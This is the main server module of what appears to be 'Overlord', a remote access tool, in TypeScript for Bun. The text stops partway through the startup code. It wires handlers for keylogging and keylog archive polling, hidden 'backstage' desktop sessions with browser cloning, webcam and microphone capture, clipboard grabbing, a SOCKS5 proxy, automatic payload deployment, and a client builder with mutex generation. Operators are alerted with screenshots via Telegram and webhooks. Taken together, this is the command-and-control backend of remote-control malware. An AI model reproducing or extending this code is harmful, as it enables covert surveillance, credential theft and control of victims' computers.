import type { ServerWebSocket } from "bun";
import { decodeMessage, encodeMessage, type WireMessage, type PluginManifest } from "./protocol";
import { logger } from "./logger";
import { fileURLToPath, pathToFileURL } from "url";
import path from "path";
import fs from "fs/promises";
import { existsSync } from "node:fs";
import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild, getNotificationScreenshot, deleteClientRow, getClientIp, banIp, isIpBanned, clientExists, deleteExpiredSharedFiles, deleteExpiredChatMessages, getClientMetricsSummary, pruneOldNotifications, isClientNotificationsMuted } from "./db";
import { handleFrame, handleHello, handlePing, handlePong } from "./wsHandlers";
import { getMessageByteLength, getMaxPayloadLimit, isAllowedClientMessageType } from "./wsValidation";
import { ClientInfo, ClientRole } from "./types";
import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "./auth";
import { loadConfig, getConfig } from "./config";
import { flushAuditLogsSync, getAuditQueueStats } from "./auditLog";
import { getUserById, getUsersForNotificationDelivery, getUsersForNotificationDeliveryByClientOwnership, isClientOwnedByUser, canUserAccessClient } from "./users";
import { requireAuth, requirePermission } from "./rbac";
import { metrics } from "./metrics";
import { getClientDbSyncStats } from "./client-db-sync";
import { ensureDataDir } from "./paths";
import { handleAuthRoutes } from "./server/routes/auth-routes";
import { handleUiRoutes } from "./server/routes/ui-routes";
import { handleAutoScriptsRoutes } from "./server/routes/auto-scripts-routes";
import { handleSavedScriptsRoutes } from "./server/routes/saved-scripts-routes";
import { handleEnrollmentRoutes, setPostApproveHook } from "./server/routes/enrollment-routes";
import { handleChatRoutes } from "./server/routes/chat-routes";
import { handleBuildRoutes } from "./server/routes/build-routes";
import { handleSolRoutes } from "./server/routes/sol-routes";
import { handleAssetsRoutes } from "./server/routes/assets-routes";
import { handleDeployRoutes } from "./server/routes/deploy-routes";
import { handleWinRERoutes } from "./server/routes/winre-routes";
import { handleFileDownloadRoutes } from "./server/routes/file-download-routes";
import { cleanupFileTransferTempFiles } from "./server/file-transfer-state";
import { handleClientRoutes } from "./server/routes/client-routes";
import { handleMiscRoutes } from "./server/routes/misc-routes";
import { handleKeylogArchiveRoutes } from "./server/routes/keylog-archive-routes";
import { handleNotificationsConfigRoutes } from "./server/routes/notifications-config-routes";
import { handleOidcRoutes } from "./server/routes/oidc-routes";
import { handlePageRoutes } from "./server/routes/page-routes";
import { handlePluginRoutes } from "./server/routes/plugin-routes";
import { handleFileShareRoutes } from "./server/routes/file-share-routes";
import { handleUsersRoutes } from "./server/routes/users-routes";
import { handlePermissionGroupsRoutes } from "./server/routes/permission-groups-routes";
import { handleWebSocketClose, handleWebSocketMessage, handleWebSocketOpen } from "./server/routes/websocket-lifecycle-routes";
import { handleWsUpgradeRoutes } from "./server/routes/ws-upgrade-routes";
import { handleWebrtcRoutes } from "./server/routes/webrtc-routes";
import { handleRemoteDesktopRecordingRoutes } from "./server/routes/rd-recording-routes";
import { isAuthorizedAgentRequest } from "./server/agent-auth";
import { generateBuildMutex, sanitizeMutex, sanitizeOutputName } from "./server/build-utils";
import { detectUploadOs, normalizeClientOs, type DeployOs } from "./server/deploy-utils";
import { CORS_HEADERS } from "./server/http-security";
import { mimeType, secureHeaders } from "./server/http-utils";
import { sanitizePluginId } from "./server/plugin-utils";
import { dispatchAutoScriptsForConnection } from "./server/auto-script-dispatch";
import { dispatchAutoDeploysForConnection } from "./server/auto-deploy-dispatch";
import { handleAutoDeployRoutes } from "./server/routes/auto-deploy-routes";
import { handleRegistrationRoutes } from "./server/routes/registration-routes";
import { consumeHttpDownloadPayload, type PendingHttpDownload } from "./server/http-download-consumer";
import { startBuildProcess as runBuildProcess } from "./server/build-process";
import { createHttpFetchHandler } from "./server/http-dispatch";
import { startMaintenanceLoops } from "./server/maintenance-loops";
import {
  deliverNotificationWithScreenshot,
  storeNotificationScreenshot,
  takePendingNotificationScreenshot,
  type NotificationRecord,
  type PendingNotificationScreenshot,
  type UserDeliveryTarget,
} from "./server/notification-delivery";
import {
  ensurePluginExtracted as ensurePluginExtractedFromRoot,
  listPluginManifests as listPluginManifestsFromRoot,
  loadPluginBundle as loadPluginBundleFromRoot,
  loadPluginStateFromDisk,
  savePluginStateToDisk,
  sendPluginBundle,
  dispatchAutoLoadPlugins,
  arePluginNeedsApproved,
} from "./server/plugin-state-bundle";
import { createPluginRuntime } from "./server/plugin-runtime/runtime";
import {
  DISCONNECT_TIMEOUT_MS,
  HEARTBEAT_INTERVAL_MS,
  MAX_WS_MESSAGE_BYTES_CLIENT,
  MAX_WS_MESSAGE_BYTES_VIEWER,
  PRUNE_BATCH,
  STALE_MS,
} from "./server/runtime-constants";
import { ALLOWED_PLATFORMS } from "./server/validation-constants";
import { prepareTlsOptions, logServerStartup } from "./server/tls-bootstrap";
import { createWebSocketRuntime } from "./server/websocket-runtime";
import {
  handleConsoleOutput,
  handleDesktopEncoderCapabilities,
  handleDesktopStreamStats,
  handleConsoleViewerMessage,
  handleConsoleViewerOpen,
  handlebackstageViewerMessage,
  handlebackstageViewerOpen,
  handleWebcamViewerMessage,
  handleWebcamViewerOpen,
  handleWebcamDevices,
  handlebackstageCloneProgress,
  handlebackstageLookupResult,
  handlebackstageBrowserCheckResult,
  handlebackstageInstalledAppsResult,
  handlebackstageDXGIStatus,
  handlebackstageBrowserLaunchStatus,
  handlebackstageWindowListResult,
  handleClipboardContent,
  handleWebrtcP2PAnswer,
  handleWebrtcP2PIce,
  cleanupRdViewerP2P,
  handleRemoteDesktopViewerMessage,
  handleRemoteDesktopViewerOpen,
  backstageStreamingState,
  notifyConsoleClosed,
  notifyRdInputLatency,
  notifyRemoteDesktopStatus,
  rdStreamingState,
  webcamStreamingState,
  sendDesktopCommand,
  sendbackstageCommand,
  stopConsoleOnTarget,
} from "./server/ws-console-rd-backstage";
import {
  handleFileBrowserMessage as forwardFileBrowserMessage,
  handleFileBrowserViewerMessage,
  handleFileBrowserViewerOpen,
  handleKeyloggerMessage,
  handleKeyloggerViewerMessage,
  handleKeyloggerViewerOpen,
  handleProcessMessage,
  handleProcessViewerMessage,
  handleProcessViewerOpen,
} from "./server/ws-file-process-proxy-keylogger";
import {
  handleProxyTunnelData,
  handleProxyTunnelClose,
  handleProxyConnectResult,
} from "./server/socks5-proxy-manager";
import {
  cleanupVoiceViewer,
  handleVoiceUplink,
  handleVoiceViewerMessage,
  handleVoiceViewerOpen,
} from "./server/ws-voice";
import {
  cleanupDesktopAudioViewer,
  handleDesktopAudioUplink,
  handleDesktopAudioViewerMessage,
  handleDesktopAudioViewerOpen,
} from "./server/ws-desktop-audio";
import { createNotificationPluginHandlers } from "./server/ws-notifications-plugin";
import { loadOrGenerateVapidKeys } from "./server/web-push";
import { getThumbnailStats } from "./thumbnails";
import * as clientManager from "./clientManager";
import * as sessionManager from "./sessions/sessionManager";
import type { SocketData } from "./sessions/types";
import { SERVER_VERSION } from "./version";
import { handleChatViewerOpen, handleChatViewerMessage } from "./server/ws-chat";
import { handleBuildTagConnection } from "./server/build-tag";
import { dispatchKeylogArchiveSync, handleKeylogArchiveMessage, pruneExpiredKeylogArchive } from "./server/keylog-archive";


metrics.setSnapshotEnricher((snapshot) => {
  const summary = getClientMetricsSummary();
  const dbSync = getClientDbSyncStats();
  const audit = getAuditQueueStats();
  const thumbnails = getThumbnailStats();
  snapshot.clients.total = summary.total;
  snapshot.clients.online = summary.online;
  snapshot.clients.offline = summary.total - summary.online;
  snapshot.clients.byOS = summary.byOS;
  snapshot.clients.byCountry = summary.byCountry;
  snapshot.sessions.console = sessionManager.getConsoleSessionCount();
  snapshot.sessions.remoteDesktop = sessionManager.getRdSessionCount();
  snapshot.sessions.fileBrowser = sessionManager.getFileBrowserSessionCount();
  snapshot.sessions.process = sessionManager.getProcessSessionCount();
  snapshot.diagnostics = {
    retained: {
      clientsMap: clientManager.getClientCount(),
      clientDbSyncTracked: dbSync.trackedClients,
      clientDbSyncPending: dbSync.pendingUpdates,
      clientDbSyncFlushScheduled: dbSync.flushScheduled,
      auditQueued: audit.queued,
      thumbnailsCached: thumbnails.cachedCount,
      thumbnailBytes: thumbnails.cachedBytes,
      thumbnailPendingFrames: thumbnails.pendingFrames,
      thumbnailGenQueued: thumbnails.genQueued,
      thumbnailGenState: thumbnails.genStateTracked,
      dashboardSessions: sessionManager.getDashboardSessionCount(),
      notificationSessions: sessionManager.getNotificationSessionCount(),
      chatSessions: sessionManager.getChatSessionCount(),
      pluginLoadedClients: pluginLoadedByClient.size,
      pluginLoadingClients: pluginLoadingByClient.size,
      pendingPluginEvents: pendingPluginEvents.size,
      pendingHttpDownloads: pendingHttpDownloads.size,
      downloadIntents: downloadIntents.size,
      deployUploads: deployUploads.size,
      winreUploads: winreUploads.size,
      notificationRateClients: notificationRate.size,
      pendingNotificationScreenshots: pendingNotificationScreenshots.size,
      rdStreamingClients: rdStreamingState.size,
      backstageStreamingClients: backstageStreamingState.size,
      webcamStreamingClients: webcamStreamingState.size,
    },
  };
});

const config = loadConfig();
const isAuthorizedAgent = (req: Request, url: URL) =>
  isAuthorizedAgentRequest(req, url, config.auth.agentToken);

const PORT = config.server.port;
const HOST = config.server.host;

function resolveRuntimeRoot(): string {
  if (process.env.OVERLORD_ROOT?.trim()) {
    return path.resolve(process.env.OVERLORD_ROOT);
  }
  const fromMeta = fileURLToPath(new URL("..", import.meta.url));
  if (existsSync(path.join(fromMeta, "public"))) return fromMeta;

  const exeDir = path.dirname(process.execPath);
  if (existsSync(path.join(exeDir, "public"))) return exeDir;

  const exeParent = path.dirname(exeDir);
  if (existsSync(path.join(exeParent, "public"))) return exeParent;

  return process.cwd();
}

const RUNTIME_ROOT = resolveRuntimeRoot();
const PUBLIC_ROOT = process.env.OVERLORD_PUBLIC_ROOT?.trim()
  ? path.resolve(process.env.OVERLORD_PUBLIC_ROOT)
  : path.join(RUNTIME_ROOT, "public");
const PLUGIN_ROOT = process.env.OVERLORD_PLUGIN_ROOT?.trim()
  ? path.resolve(process.env.OVERLORD_PLUGIN_ROOT)
  : path.join(RUNTIME_ROOT, "plugins");
const PLUGIN_STATE_PATH = path.join(PLUGIN_ROOT, ".plugin-state.json");
const DATA_DIR = ensureDataDir();
const DEPLOY_ROOT = path.join(DATA_DIR, "deploy");
const WINRE_ROOT = path.join(DATA_DIR, "winre");
const FILE_SHARE_ROOT = path.join(DATA_DIR, "file-share");

function resolvePluginWorkerHostUrl(): string {
  const builtWorker = path.join(RUNTIME_ROOT, "dist", "server", "plugin-runtime", "worker-host.js");
  if (existsSync(builtWorker)) {
    return pathToFileURL(builtWorker).href;
  }
  return new URL("./server/plugin-runtime/worker-host.ts", import.meta.url).href;
}

const TLS_CERT_PATH = config.tls.certPath;
const TLS_KEY_PATH = config.tls.keyPath;
const TLS_CA_PATH = config.tls.caPath; 
const TLS_CERTBOT = config.tls.certbot;

function envFlagEnabled(name: string): boolean {
  const value = String(process.env[name] || "").trim().toLowerCase();
  return value === "1" || value === "true" || value === "yes" || value === "on";
}

const TLS_OFFLOAD = envFlagEnabled("OVERLORD_TLS_OFFLOAD");

function parseMaxHttpBodyBytes(): number {
  const raw = String(process.env.OVERLORD_MAX_HTTP_BODY_BYTES || "").trim();
  if (raw !== "") {
    const parsed = Number(raw);
    if (Number.isFinite(parsed) && parsed > 0) {
      return Math.floor(parsed);
    }
    logger.warn(`[HTTP] Invalid OVERLORD_MAX_HTTP_BODY_BYTES=${raw}; using default`);
  }
  return 1024 * 1024 * 1024;
}

const MAX_HTTP_BODY_BYTES = parseMaxHttpBodyBytes();

const pluginLoadedByClient = new Map<string, Set<string>>();
const pendingPluginEvents = new Map<string, Array<{ event: string; payload: any }>>();
const pluginLoadingByClient = new Map<string, Set<string>>();
let pluginState = { enabled: {} as Record<string, boolean>, lastError: {} as Record<string, string>, autoLoad: {} as Record<string, boolean>, autoStartEvents: {} as Record<string, Array<{ event: string; payload: any }>>, approvedNeeds: {} as Record<string, string> };

const savePluginState = () => savePluginStateToDisk(PLUGIN_ROOT, PLUGIN_STATE_PATH, pluginState);
const loadPluginState = async () => {
  pluginState = await loadPluginStateFromDisk(PLUGIN_STATE_PATH);
};

const pluginRuntime = createPluginRuntime({
  pluginRoot: PLUGIN_ROOT,
  workerHostUrl: resolvePluginWorkerHostUrl(),
  setLastError: (pluginId, error) => {
    pluginState.lastError[pluginId] = error;
    void savePluginState();
  },
});
const ensurePluginExtracted = (pluginId: string) =>
  ensurePluginExtractedFromRoot(PLUGIN_ROOT, pluginId, sanitizePluginId);
const listPluginManifests = () =>
  listPluginManifestsFromRoot(PLUGIN_ROOT, pluginState, savePluginState, ensurePluginExtracted);
const loadPluginBundle = (pluginId: string, clientOS?: string, clientArch?: string) =>
  loadPluginBundleFromRoot(PLUGIN_ROOT, pluginId, ensurePluginExtracted, clientOS, clientArch);
const startBuildProcess = (buildId: string, buildConfig: any) =>
  runBuildProcess(buildId, buildConfig, {
    generateBuildMutex,
    sanitizeOutputName,
    fileShareRoot: FILE_SHARE_ROOT,
    runBuildHookForAll: (hook, payload) => pluginRuntime.runBuildHookForAll(hook, payload),
  });

const pendingHttpDownloads = new Map<string, PendingHttpDownload>();

type DownloadIntent = {
  id: string;
  userId: number;
  clientId: string;
  path: string;
  expiresAt: number;
  timeout: ReturnType<typeof setTimeout>;
};

const downloadIntents = new Map<string, DownloadIntent>();

type DeployUpload = {
  id: string;
  path: string;
  name: string;
  size: number;
  os: DeployOs;
};

const deployUploads = new Map<string, DeployUpload>();

type WinREUpload = {
  id: string;
  path: string;
  name: string;
  size: number;
};

const winreUploads = new Map<string, WinREUpload>();

type NotificationRateState = {
  lastSent: number;
  windowStart: number;
  suppressed: number;
  lastWarned: number;
};

const notificationRate = new Map<string, NotificationRateState>();
const getNotificationConfig = () => getConfig().notifications;

const pendingNotificationScreenshots = new Map<string, PendingNotificationScreenshot>();
const takePendingNotificationScreenshotForClient = (clientId: string) =>
  takePendingNotificationScreenshot(pendingNotificationScreenshots, clientId);
const storeNotificationScreenshotForPending = (
  pending: PendingNotificationScreenshot,
  bytes: Uint8Array,
  format: string,
  width?: number,
  height?: number,
) => storeNotificationScreenshot(pending, bytes, format, width, height);

pruneOldNotifications();
setInterval(pruneOldNotifications, 60 * 60 * 1000);

const toDeliveryTarget = (u: any): UserDeliveryTarget => ({
  userId: u.id,
  username: u.username,
  webhookEnabled: u.webhook_enabled === 1,
  webhookUrl: u.webhook_url || "",
  webhookTemplate: u.webhook_template,
  telegramEnabled: u.telegram_enabled === 1,
  telegramBotToken: u.telegram_bot_token || "",
  telegramChatId: u.telegram_chat_id || "",
  telegramTemplate: u.telegram_template,
  clientEventWebhook: u.client_event_webhook === 1,
  clientEventTelegram: u.client_event_telegram === 1,
  clientEventPush: u.client_event_push === 1,
});

const deliverNotificationWithScreenshotForRecord = (record: NotificationRecord) => {
  const getUserDeliveryTargets = (clientId: string): UserDeliveryTarget[] => {
    const all = getUsersForNotificationDelivery();
    return all.filter((u) => canUserAccessClient(u.id, u.role, clientId)).map(toDeliveryTarget);
  };
  return deliverNotificationWithScreenshot(record, getUserDeliveryTargets);
};

const notificationPluginHandlers = createNotificationPluginHandlers({
  notificationRate,
  pendingNotificationScreenshots,
  pluginLoadedByClient,
  pluginLoadingByClient,
  pendingPluginEvents,
  pluginState,
  getNotificationConfig,
  canUserAccessClient: canUserAccessClient as (userId: number, userRole: string, clientId: string) => boolean,
  isClientOwnedByUser,
  getUserRole: (userId: number) => getUserById(userId)?.role,
  isClientNotificationsMuted,
  storeNotificationScreenshot: storeNotificationScreenshotForPending,
  deliverNotificationWithScreenshot: deliverNotificationWithScreenshotForRecord,
  forwardPluginEventToRuntime: (clientId, pluginId, event, payload) =>
    pluginRuntime.dispatchClientEvent(clientId, pluginId, event, payload),
  getDeliveryTargetsForClientEvent: (event: string, clientId: string): UserDeliveryTarget[] => {
    if (event === "client_purgatory") {
      return getUsersForNotificationDeliveryByClientOwnership(clientId).map(toDeliveryTarget);
    }
    return getUsersForNotificationDelivery()
      .filter((u) => canUserAccessClient(u.id, u.role, clientId))
      .map(toDeliveryTarget);
  },
  savePluginState,
});

type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "backstage_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "notifications_viewer";

type PendingScript = {
  resolve: (result: any) => void;
  reject: (error: any) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};
const pendingScripts = new Map<string, PendingScript>();

type PendingCommandReply = {
  resolve: (result: { ok: boolean; message?: string }) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};
const pendingCommandReplies = new Map<string, PendingCommandReply>();

async function startServer() {
  await loadPluginState();

  try {
    const manifests = await listPluginManifests();
    for (const manifest of manifests) {
      if (pluginState.enabled[manifest.id] === false) continue;
      if (!pluginRuntime.hasServerCode(manifest.id)) continue;
      try {
        await pluginRuntime.startPlugin(manifest.id);
      } catch (err) {
        logger.warn(`[plugin-runtime] boot failed for ${manifest.id}: ${(err as Error).message}`);
      }
    }
  } catch (err) {
    logger.warn(`[plugin-runtime] startup scan failed: ${(err as Error).message}`);
  }

  setPostApproveHook((clientId: string) => {
    const client = clientManager.getClient(clientId);
    if (!client) return;
    dispatchAutoLoadPlugins(
      client,
      pluginState,
      notificationPluginHandlers.isPluginLoaded,
      notificationPluginHandlers.isPluginLoading,
      notificationPluginHandlers.markPluginLoading,
      notificationPluginHandlers.enqueuePluginEvent,
      loadPluginBundle,
    ).catch((err) => {
      logger.warn(`[enrollment] failed to dispatch auto-load plugins for ${clientId}: ${(err as Error).message}`);
    });
  });

  await cleanupFileTransferTempFiles(DATA_DIR);
  logger.info("[filebrowser] cleaned stale transfer temp files on startup");
  let tls:
    | {
        tlsOptions: { cert?: string; key?: string; ca?: string };
        certPathUsed: string;
        source: "certbot" | "configured" | "self-signed";
      }
    | null = null;

  if (TLS_OFFLOAD) {
    logger.warn(
      "[TLS] OVERLORD_TLS_OFFLOAD=true: TLS is expected to terminate at an external proxy/load balancer.",
    );
    logger.warn("[TLS] Running internal HTTP listener only. Do not expose the container port directly to the internet.");
  } else {
    tls = await prepareTlsOptions({
      certPath: TLS_CERT_PATH,
      keyPath: TLS_KEY_PATH,
      caPath: TLS_CA_PATH,
      certbot: TLS_CERTBOT,
    });
  }

  const routeDeps = {
    notificationsConfig: {
      getNotificationScreenshot,
      secureHeaders,
    },
    build: {
      startBuildProcess,
      sanitizeMutex,
      allowedPlatforms: ALLOWED_PLATFORMS,
      listPluginManifests,
    },
    deploy: {
      DEPLOY_ROOT,
      deployUploads,
      pendingCommandReplies,
      detectUploadOs,
      normalizeClientOs,
    },
    autoDeploy: {
      DEPLOY_ROOT,
      detectUploadOs,
    },
    winre: {
      WINRE_ROOT,
      winreUploads,
      pendingCommandReplies,
    },
    fileDownload: {
      DATA_DIR,
      secureHeaders,
      sanitizeOutputName,
      pendingHttpDownloads,
      downloadIntents,
    },
    plugin: {
      PLUGIN_ROOT,
      PUBLIC_ROOT,
      pluginState,
      pluginLoadedByClient,
      pluginLoadingByClient,
      pendingPluginEvents,
      sanitizePluginId,
      ensurePluginExtracted,
      savePluginState,
      listPluginManifests,
      loadPluginBundle,
      sendPluginBundle,
      markPluginLoading: notificationPluginHandlers.markPluginLoading,
      isPluginLoaded: notificationPluginHandlers.isPluginLoaded,
      isPluginLoading: notificationPluginHandlers.isPluginLoading,
      enqueuePluginEvent: notificationPluginHandlers.enqueuePluginEvent,
      drainPluginUIEvents: notificationPluginHandlers.drainPluginUIEvents,
      secureHeaders,
      mimeType,
      pluginRuntime,
    },
    fileShare: {
      FILE_SHARE_ROOT,
    },
    misc: {
      CORS_HEADERS,
      SERVER_VERSION,
      PUBLIC_ROOT,
      getConsoleSessionCount: sessionManager.getConsoleSessionCount,
      getRdSessionCount: sessionManager.getRdSessionCount,
      getFileBrowserSessionCount: sessionManager.getFileBrowserSessionCount,
      getProcessSessionCount: sessionManager.getProcessSessionCount,
      tlsCertPath: tls?.certPathUsed,
      tlsSource: tls?.source,
    },
    assets: {
      PUBLIC_ROOT,
      secureHeaders,
      mimeType,
    },
    page: {
      PUBLIC_ROOT,
      secureHeaders,
      mimeType,
    },
    client: {
      CORS_HEADERS,
      pendingScripts,
      pendingCommandReplies,
      broadcastNotificationsCleared: notificationPluginHandlers.broadcastNotificationsCleared,
    },
    rdRecording: {
      secureHeaders,
    },
    wsUpgrade: {
      isAuthorizedAgentRequest: isAuthorizedAgent,
    },
    registration: {},
  };

  const lifecycleDeps = {
    maxClientPayloadBytes: MAX_WS_MESSAGE_BYTES_CLIENT,
    maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
    pendingScripts,
    pendingCommandReplies,
    rdStreamingState,
    backstageStreamingState,
    webcamStreamingState,
    getNotificationConfig,
    handleConsoleViewerOpen,
    handleRemoteDesktopViewerOpen,
    handleWebcamViewerOpen,
    handlebackstageViewerOpen,
    handleFileBrowserViewerOpen,
    handleProcessViewerOpen,
    handleKeyloggerViewerOpen,
    handleVoiceViewerOpen,
    handleDesktopAudioViewerOpen,
    handleDashboardViewerOpen: (ws: import("bun").ServerWebSocket<SocketData>) => {
      const id = crypto.randomUUID();
      ws.data.sessionId = id;
      sessionManager.addDashboardSession({
        id,
        viewer: ws,
        createdAt: Date.now(),
        userId: ws.data.userId,
        userRole: ws.data.userRole,
      });
    },
    handleNotificationViewerOpen: notificationPluginHandlers.handleNotificationViewerOpen,
    handleChatViewerOpen,
    handleChatViewerMessage,
    handleConsoleViewerMessage,
    handleRemoteDesktopViewerMessage,
    handleWebcamViewerMessage,
    handlebackstageViewerMessage,
    handleFileBrowserViewerMessage,
    handleProcessViewerMessage,
    handleKeyloggerViewerMessage,
    handleVoiceViewerMessage,
    handleDesktopAudioViewerMessage,
    dispatchAutoScriptsForConnection,
    dispatchAutoDeploysForConnection: (info: import("./types").ClientInfo, ws: import("bun").ServerWebSocket<SocketData>) => {
      dispatchAutoDeploysForConnection(info, ws, { pendingCommandReplies });
    },
    dispatchAutoLoadPlugins: (info: import("./types").ClientInfo) => {
      dispatchAutoLoadPlugins(
        info,
        pluginState,
        notificationPluginHandlers.isPluginLoaded,
        notificationPluginHandlers.isPluginLoading,
        notificationPluginHandlers.markPluginLoading,
        notificationPluginHandlers.enqueuePluginEvent,
        loadPluginBundle,
        async (pluginId: string) => {
          const manifests = await listPluginManifests();
          const manifest = manifests.find((p) => p.id === pluginId);
          if (!manifest) return false;
          return arePluginNeedsApproved(pluginState, pluginId, manifest.needs);
        },
      ).catch((err) => {
        logger.warn(`[plugin-autoload] dispatch error for ${info.id}: ${(err as Error).message}`);
      });
    },
    dispatchKeylogArchiveSync,
    takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
    storeNotificationScreenshot: storeNotificationScreenshotForPending,
    handleNotificationScreenshotResult: notificationPluginHandlers.handleNotificationScreenshotResult,
    handleConsoleOutput: (clientId: string, payload: any) => handleConsoleOutput(clientId, payload),
    handleDesktopEncoderCapabilities: (clientId: string, payload: any) => handleDesktopEncoderCapabilities(clientId, payload),
    handleDesktopStreamStats: (clientId: string, payload: any) => handleDesktopStreamStats(clientId, payload),
    handleFileBrowserMessage: (clientId: string, payload: any) =>
      forwardFileBrowserMessage(clientId, payload, {
        pendingHttpDownloads,
        consumeHttpDownloadPayload: (downloadPayload: any) =>
          consumeHttpDownloadPayload(downloadPayload, pendingHttpDownloads),
      }),
    handleProxyTunnelData,
    handleProxyTunnelClose,
    handleProxyConnectResult,
    handleProcessMessage,
    handleKeyloggerMessage,
    handleKeylogArchiveMessage,
    notifyRdInputLatency,
    handleNotificationScreenshotFailure: notificationPluginHandlers.handleNotificationScreenshotFailure,
    handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
    handleNotification: notificationPluginHandlers.handleNotification,
    handleVoiceUplink,
    handleDesktopAudioUplink,
    handleWebcamDevices,
    handlebackstageCloneProgress,
    handlebackstageLookupResult,
    handlebackstageBrowserCheckResult,
    handlebackstageInstalledAppsResult,
    handlebackstageDXGIStatus,
    handlebackstageBrowserLaunchStatus,
    handlebackstageWindowListResult,
    handleClipboardContent,
    handleWebrtcP2PAnswer,
    handleWebrtcP2PIce,
    cleanupRdViewerP2P,
    cleanupVoiceViewer,
    cleanupDesktopAudioViewer,
    stopConsoleOnTarget,
    sendDesktopCommand,
    sendbackstageCommand,
    notifyConsoleClosed,
    clearPendingNotificationScreenshots: notificationPluginHandlers.clearPendingNotificationScreenshots,
    clearClientPluginState: notificationPluginHandlers.clearClientPluginState,
    notifyRemoteDesktopStatus,
    handleBuildTagConnection,
    notifyDashboard: sessionManager.notifyDashboardViewers,
    notifyDashboardClientEvent: sessionManager.notifyDashboardClientEvent,
    broadcastClientEvent: notificationPluginHandlers.broadcastClientLifecycleEvent,
    handleCrashReport: notificationPluginHandlers.handleCrashReport,
  };

  const server = Bun.serve<SocketData>({
    port: PORT,
    hostname: HOST,
    ...(tls ? { tls: tls.tlsOptions } : {}),
    idleTimeout: 255,
    maxRequestBodySize: MAX_HTTP_BODY_BYTES,
    fetch: createHttpFetchHandler({
      metrics,
      CORS_HEADERS,
      routes: [
        (req, url, srv) => handleRegistrationRoutes(req, url, {
          ...routeDeps.registration,
          requestIP: (srv as any).requestIP,
        }),
        (req, url, srv) => handleUiRoutes(req, url, srv as any),
        (req, url, srv) => handleAuthRoutes(req, url, srv as any),
        (req, url, srv) => handleOidcRoutes(req, url, srv as any),
        (req, url, srv) => handleNotificationsConfigRoutes(req, url, srv as any, routeDeps.notificationsConfig),
        (req, url) => handleAutoScriptsRoutes(req, url),
        (req, url) => handleSavedScriptsRoutes(req, url),
        (req, url) => handleAutoDeployRoutes(req, url, routeDeps.autoDeploy),
        (req, url) => handleEnrollmentRoutes(req, url),
        (req, url) => handleChatRoutes(req, url),
        (req, url) => handleSolRoutes(req, url),
        (req, url, srv) => handleUsersRoutes(req, url, srv as any),
        (req, url, srv) => handlePermissionGroupsRoutes(req, url, srv as any),
        (req, url, srv) => handleBuildRoutes(req, url, srv as any, routeDeps.build),
        (req, url, srv) => handleDeployRoutes(req, url, srv as any, routeDeps.deploy),
        (req, url, srv) => handleWinRERoutes(req, url, srv as any, routeDeps.winre),
        (req, url, srv) => handleFileDownloadRoutes(req, url, srv as any, routeDeps.fileDownload),
        (req, url) => handleKeylogArchiveRoutes(req, url, { CORS_HEADERS }),
        (req, url) => handlePluginRoutes(req, url, routeDeps.plugin),
        (req, url) => handleFileShareRoutes(req, url, routeDeps.fileShare),
        (req, url, srv) => handleMiscRoutes(req, url, {
          ...routeDeps.misc,
          requestIP: (srv as any).requestIP,
        }),
        (req, url) => handleAssetsRoutes(req, url, routeDeps.assets),
        (req, url, srv) => handlePageRoutes(req, url, {
          ...routeDeps.page,
          requestIP: (srv as any).requestIP,
        }),
        (req, url) => handleWebrtcRoutes(req, url),
        (req, url, srv) => handleClientRoutes(req, url, srv as any, routeDeps.client),
        (req, url, srv) => handleWsUpgradeRoutes(req, url, srv as any, routeDeps.wsUpgrade),
        (req, url) => handleRemoteDesktopRecordingRoutes(req, url, routeDeps.rdRecording),
      ],
    }),
    websocket: createWebSocketRuntime({
      maxClientPayloadBytes: MAX_WS_MESSAGE_BYTES_CLIENT,
      maxViewerPayloadBytes: MAX_WS_MESSAGE_BYTES_VIEWER,
      lifecycleDeps,
      handleWebSocketOpen,
      handleWebSocketMessage,
      handleWebSocketClose,
    }),
  });

  
  markAllClientsOffline();
  loadOrGenerateVapidKeys();
  
  deleteExpiredBuilds();
  logger.info(`[db] Cleaned up expired builds`);

  const expiredPaths = deleteExpiredSharedFiles();
  for (const p of expiredPaths) {
    try { const dir = path.dirname(p); await fs.rm(dir, { recursive: true, force: true }); } catch {}
  }
  if (expiredPaths.length) logger.info(`[db] Cleaned up ${expiredPaths.length} expired shared files`);

  const chatRetentionDays = getConfig().chat?.retentionDays ?? 30;
  if (chatRetentionDays > 0) {
    const retentionMs = chatRetentionDays * 24 * 60 * 60 * 1000;
    const purged = deleteExpiredChatMessages(retentionMs);
    if (purged > 0) logger.info(`[db] Cleaned up ${purged} expired chat messages (retention: ${chatRetentionDays}d)`);
  }

  const purgedKeylogs = pruneExpiredKeylogArchive();
  if (purgedKeylogs > 0) logger.info(`[keylog-archive] Cleaned up ${purgedKeylogs} expired archived input logs`);
  let lastKeylogArchivePollAt = 0;
  setInterval(() => {
    const purged = pruneExpiredKeylogArchive();
    if (purged > 0) logger.info(`[keylog-archive] Cleaned up ${purged} expired archived input logs`);
  }, 60 * 60 * 1000);
  setInterval(() => {
    const cfg = getConfig().inputArchive;
    if (!cfg?.enabled || cfg.pollIntervalSeconds <= 0) return;
    const now = Date.now();
    const intervalMs = cfg.pollIntervalSeconds * 1000;
    if (now - lastKeylogArchivePollAt < intervalMs) return;
    lastKeylogArchivePollAt = now;

    let requested = 0;
    for (const client of clientManager.getAllClients().values()) {
      if (!client?.id || client.role !== "client" || !client.ws) continue;
      if (dispatchKeylogArchiveSync(client.id, client.ws)) requested++;
    }
    if (requested > 0) {
      logger.debug(`[keylog-archive] Poll requested keylog lists from ${requested} connected clients`);
    }
  }, 30 * 1000);

  setInterval(() => {
    const days = getConfig().chat?.retentionDays ?? 30;
    if (days > 0) {
      const ms = days * 24 * 60 * 60 * 1000;
      const count = deleteExpiredChatMessages(ms);
      if (count > 0) logger.info(`[chat] Purged ${count} expired messages (retention: ${days}d)`);
    }
  }, 60 * 60 * 1000); // every hour

  startMaintenanceLoops({
    getClients: clientManager.getAllClients,
    setOnlineState,
    deleteClient: clientManager.deleteClient,
    staleMs: STALE_MS,
    pruneBatch: PRUNE_BATCH,
